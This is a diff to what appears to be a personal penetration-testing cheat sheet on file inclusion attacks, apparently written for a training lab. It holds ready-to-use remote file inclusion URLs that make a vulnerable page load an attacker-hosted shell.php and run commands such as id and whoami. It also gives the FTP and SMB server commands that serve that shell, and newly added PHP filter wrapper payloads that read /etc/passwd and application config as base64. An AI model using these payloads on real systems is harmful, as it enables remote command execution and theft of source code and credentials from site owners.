@@ -60,10 +60,18 @@ eg. shell.php
 call the file with url http://website.com/index.php?language=http://yourserverip:8080/shell.php&cmd=id
 * FTP RFI can also be done via the below command while executing url http://blog.inlanefreight.com/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id
 > python -m pyftpdlib -p 21
-* Windos RFI 
+* Windows RFI 
  can be called via the below command and url as follows http://blog.inlanefreight.com/index.php?language=\\serverIp\share\shell.php&cmd=whoami
 > smbserver.py -smb2support share $(pwd)
-
+* Source Code Disclosure via PHP Wrappers
+Can be done via the following code 
+> php://filter/read=convert.base64-encode/resource=/etc/passwd
+> php://filter/read=string.rot13/resource=/etc/passwd
+> eg. http://134.209.184.216:32391/extension/index.php?language=php://filter/read=convert.base64-encode/resource=config
+Then execute the URL in linux console proceeded by cURL to get the code.
+Decrypt the code via command 
+> echo 'insert-code-here' | base64 -d
+/ilf_admin/index.php?
 *
 
 
